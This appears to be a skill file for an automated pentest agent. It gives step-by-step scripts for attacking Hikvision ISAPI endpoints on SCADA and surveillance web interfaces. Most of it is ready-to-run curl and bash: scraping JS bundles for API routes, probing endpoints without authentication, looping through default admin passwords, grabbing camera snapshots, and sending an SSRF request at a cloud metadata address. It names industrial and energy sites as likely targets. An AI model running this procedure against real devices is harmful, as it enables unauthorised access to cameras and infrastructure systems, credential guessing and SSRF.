---
name: scada-hikvision-isapi
description: Enumerate and fingerprint Hikvision ISAPI endpoints on SCADA/IoT web interfaces.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires agentiko worker (curl, nmap, python3)
metadata:
  hermes:
    tags: [recon, SCADA, Hikvision, ISAPI, IoT, camera, RTSP, ONVIF, industrial]
    category: recon
    related_skills:
      - port-service-discovery
      - hunt-ssrf
      - iot-camera-recon
      - js-secrets-extraction
---

# SCADA Hikvision ISAPI Enumeration

Enumerate Hikvision ISAPI (Intelligent Security Application Programming Interface) endpoints on industrial control and surveillance web interfaces. Hikvision devices and HikCentral Professional deployments expose a rich REST/XML API at predictable paths. While most endpoints require authentication (CAS session token, Basic auth, or Digest auth), unauthenticated enumeration reveals the device type, firmware baseline, available modules, and potential attack surface. JavaScript bundles often contain the full ISAPI route tree.

## When to Use

- A web interface on a non-standard port (443, 8443, 9443) loads a large JavaScript bundle with references to `/ISAPI/`, `Bumblebee`, or `Streaming/channels`.
- Port scan reveals RTSP (554), ONVIF (8899), or Hikvision-specific ports (8000, 9010).
- The server header or SSL certificate references Hikvision, HikCentral, iVMS, or Pyramid.
- A target has industrial/energy/infrastructure context where SCADA systems are likely.
- The web client loads `Common/common.js`, `Common/components.js`, or `Common/vendorGraph.js` from a relative path.

## Prerequisites

- `terminal` tool with curl, python3, and nmap.
- Access to the web interface (even without authentication).
- The target serves JavaScript bundles — download them for endpoint extraction.

## Quick Detection

```bash
# Fingerprint the web interface
curl -skI "https://TARGET:PORT/" | grep -iE "server|x-powered"

# Download the main JS bundle and scan for ISAPI endpoints
curl -sk "https://TARGET:PORT/" | grep -oP 'src="([^"]+\.js[^"]*)"' | while read -r match; do
  js_url=$(echo "$match" | grep -oP '(\./[^"]+\.js[^"]*|/[^"]+\.js[^"]*)')
  [ -n "$js_url" ] && curl -sk "https://TARGET:PORT$js_url" | grep -oP '/ISAPI/[^"'\''\s]{5,80}' | sort -u
done
```

## Procedure

### Phase 1 — Endpoint Extraction from JS Bundles

Hikvision web clients embed the complete API route tree in JavaScript:

```bash
# Download all JS files referenced in the main page
curl -sk "https://TARGET:PORT/" | python3 -c "
import sys, re, requests, urllib3
urllib3.disable_warnings()

html = sys.stdin.read()
base = 'https://TARGET:PORT'

# Find all JS files
scripts = set(re.findall(r'(?:src|href)=\"([^\"]+\.js[^\"]*)\"', html))
for js in scripts:
    url = js if js.startswith('http') else f'{base}{js}' if js.startswith('/') else f'{base}/{js}'
    try:
        r = requests.get(url, verify=False, timeout=10)
        if r.status_code == 200:
            # Extract ISAPI paths
            paths = set(re.findall(r'/ISAPI/[A-Za-z0-9_/]+', r.text))
            if paths:
                print(f'\n{url} ({len(r.text)} bytes):')
                for p in sorted(paths)[:30]:
                    print(f'  {p}')
    except: pass
"
```

### Phase 2 — Unauthenticated Endpoint Probing

Test extracted ISAPI paths without authentication:

```bash
ISAPI_PATHS=(
  "/ISAPI/Bumblebee/Platform/V0/KeepLive"
  "/ISAPI/Bumblebee/Platform/V0/CAS/SlaveSession"
  "/ISAPI/Bumblebee/Platform/V1/RecentlyVisitedMenu"
  "/ISAPI/Bumblebee/Platform/V1/SystemConfig/SceneConfig"
  "/ISAPI/Bumblebee/Platform/V0/LogicalResource/CameraElements/"
  "/ISAPI/Bumblebee/DeviceResource/V0/Servers/RecordServers/"
  "/ISAPI/Bumblebee/DeviceResource/V1/PhysicalResource/Devices/"
  "/ISAPI/Bumblebee/Platform/V1/Storage/LocalCloudStorageConfig"
  "/ISAPI/Bumblebee/Platform/V1/Permission/Security/UserPermission"
  "/ISAPI/Bumblebee/Platform/V0/RSM/Sites/"
  "/ISAPI/Streaming/channels/101/picture"
  "/ISAPI/ContentMgmt/StreamingProxy/channel/"
  "/ISAPI/ContentMgmt/download"
)

for path in "${ISAPI_PATHS[@]}"; do
  response=$(curl -sk -w "\n%{http_code}" "https://TARGET:PORT$path" 2>/dev/null)
  code=$(echo "$response" | tail -1)
  body=$(echo "$response" | head -n -1)
  
  echo "=== $path ($code) ==="
  echo "$body" | head -5
  
  # Decode error codes
  if echo "$body" | grep -q "ErrorCode"; then
    error=$(echo "$body" | grep -oP 'ErrorCode\"?\s*[:\s]*(\d+)' | grep -oP '\d+')
    case $error in
      216) echo "  → SESSION_ERROR (auth required)";;
      401) echo "  → UNAUTHORIZED";;
      403) echo "  → FORBIDDEN";;
      404) echo "  → NOT_FOUND";;
      *)   echo "  → Code $error";;
    esac
  fi
done
```

### Phase 3 — Authentication Testing

Test common credential patterns:

```bash
# XML-based CAS session login
curl -sk -X POST "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V0/CAS/SlaveSession" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<SessionLogin xmlns="http://www.isapi.org/ver20/XMLSchema" version="2.0">
  <userName>admin</userName>
  <password>PASSWORD</password>
  <sessionList><session><id>1</id></session></sessionList>
</SessionLogin>'

# JSON-based login
curl -sk -X POST "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V0/User/Login" \
  -H "Content-Type: application/json" \
  -d '{"userName":"admin","password":"PASSWORD"}'

# Test default passwords
for pw in admin 12345 123456 password admin123 Hikvision123 hikvision; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V0/KeepLive" \
    -u "admin:$pw")
  [ "$code" != "401" ] && echo "Basic auth: admin:$pw → $code"
done
```

### Phase 4 — Streaming and Camera Access

If camera channels are accessible:

```bash
# Try camera snapshots (channel 1-16)
for ch in 1 101 201 301; do
  curl -sk "https://TARGET:PORT/ISAPI/Streaming/channels/$ch/picture" \
    -o "camera_$ch.jpg"
  [ -s "camera_$ch.jpg" ] && echo "Snapshot ch$ch: $(wc -c < camera_$ch.jpg) bytes"
done

# Check for RTSP streaming info
curl -sk "https://TARGET:PORT/ISAPI/Streaming/channels/" | head -20

# ONVIF service discovery
curl -sk -X POST "https://TARGET:PORT/onvif/device_service" \
  -H "Content-Type: application/soap+xml" \
  -d '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
    <s:Body><GetServices xmlns="http://www.onvif.org/ver10/device/wsdl"/>
    </s:Body></s:Envelope>'
```

### Phase 5 — Dangerous Endpoints

Prioritize these endpoints which may enable SSRF, data access, or privilege escalation:

```bash
# HTTP pass-through (potential SSRF)
curl -sk -X POST "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V1/DAM/HTTPPassThrough" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/"}' 

# Cloud storage configuration exposure
curl -sk "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V1/Storage/LocalCloudStorageConfig"

# User permission enumeration
curl -sk "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V1/Permission/Security/UserPermission"

# Remote site management
curl -sk "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V0/RSM/Sites/"
```

## Pitfalls

- **ErrorCode 216 is not a hard block.** It means "session required" — the endpoint is live but needs authentication. This is still a finding (exposed service).
- **HikCentral vs. standalone device.** HikCentral Professional (web-managed) uses CAS/SlaveSession. Standalone NVRs/cameras use Basic or Digest auth. The auth method tells you the deployment type.
- **WebSocket endpoints are hidden.** The JS references `ws://127.0.0.1:` for local WebSocket connections. External WebSocket endpoints may use different ports.
- **RTSP is often UDP.** Standard port scans miss it. Use `nmap -sU -p 554` for UDP RTSP detection.
- **ONVIF may be on port 80/8080, not 8899.** Probe multiple ports with the ONVIF SOAP request.

## Verification

1. Confirm at least 5 ISAPI endpoints respond (even with ErrorCode 216).
2. Extract and document the complete endpoint tree from JavaScript bundles.
3. Test each endpoint with and without Basic auth credentials.
4. If any endpoint returns data without authentication, document the exposed information.
5. Map the attack surface: cameras, streaming, storage, permissions, remote sites.

## Related Skills

- **`port-service-discovery`** — Detecting Hikvision/RTSP/ONVIF ports.
- **`hunt-ssrf`** — Exploiting the HTTPPassThrough proxy for SSRF.
- **`iot-camera-recon`** — General IP camera reconnaissance patterns.
- **`js-secrets-extraction`** — Extracting API keys and tokens from JS bundles that may authenticate ISAPI requests.
